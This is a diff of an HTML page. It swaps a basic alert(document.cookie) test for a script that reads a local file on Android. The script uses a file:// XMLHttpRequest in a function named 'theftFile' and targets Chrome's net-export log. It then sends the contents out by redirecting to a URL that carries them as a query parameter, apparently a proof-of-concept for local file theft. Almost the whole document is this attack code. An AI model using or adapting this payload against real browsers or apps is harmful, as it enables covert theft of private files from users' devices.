@@ -1,8 +1,25 @@
 <html>
 <head>
-  <script>
-     alert(document.cookie);
-  </script>
+<script type="text/javascript">
+    function theftFile(path, callback) {
+      var req = new XMLHttpRequest();
+
+      req.open("GET", "file://" + path, true);
+      req.onload = function(e) {
+        callback(req.responseText);
+      }
+      req.onerror = function(e) {
+        callback(null);
+      }
+      req.send();
+    }
+
+    var file = "/data/user/0/com.android.chrome/cache/net-export/chrome-net-export-log.json";
+
+    theftFile(file, function(contents) {
+        location.href = "https://localhost/?data=" + encodeURIComponent(contents);
+    });
+</script>
 </head>
 <body>
 </body>
